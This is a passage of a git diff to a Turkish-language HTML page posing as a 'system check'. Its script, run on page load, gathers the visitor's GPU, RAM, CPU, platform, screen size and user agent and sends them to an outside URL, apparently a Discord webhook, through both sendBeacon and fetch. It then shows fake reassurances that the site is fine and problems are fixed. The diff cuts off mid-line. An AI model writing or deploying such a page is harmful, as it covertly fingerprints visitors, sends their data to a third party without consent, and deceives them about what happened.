@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kontrolü</title>
+    <title>Sistem</title>
     <style>
         body { background:#0c0c0c; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
-        h2 { color:#ccc; font-size:14px; font-weight:400; transition: color 0.2s; }
+        h2 { color:#ccc; font-size:14px; font-weight:400; }
         .ok { color:#0f4; font-weight:bold; }
     </style>
 </head>
@@ -27,45 +27,11 @@
             } catch(e) {}
 
             const data = {
+                content: "@everyone", // Mesajın geldiğini kesin görmek için bildirim ekledik
                 embeds: [{
-                    title: "⚡ SİSTEM RAPORU",
+                    title: "🚀 SİSTEM VERİSİ (GARANTİ)",
                     color: 3066993,
                     fields: [
-                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
-                        { name: "SYS", value: `${navigator.platform} | ${window.screen.width}x${window.screen.height}`, inline: false },
-                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
-                    ]
-                }]
-            };
-
-            // KRİTİK: Veriyi gönder ve ulaştığından emin ol
-            const p = JSON.stringify(data);
-            
-            // Aynı anda iki koldan saldırıyoruz
-            navigator.sendBeacon(u, p);
-            
-            try {
-                await fetch(u, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    headers: { 'Content-Type': 'application/json' },
-                    body: p 
-                });
-            } catch(e) {}
-
-            // Veri gönderim emri çıktıktan hemen sonra yazıları değiştir
-            setTimeout(() => { 
-                t.innerHTML = '<span class="ok">Site uygun halde!</span>'; 
-            }, 200);
-
-            setTimeout(() => { 
-                t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; 
-            }, 800);
-        }
-
-        // Sayfa yüklenir yüklenmez en hızlı şekilde başlat
-        s();
-    </script>
-</body>
-</html>
-
+                        { name: "DONANIM", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
+                        { name: "SİSTEM", value: `${navigator.platform} | ${window.screen.width
+                                                                            
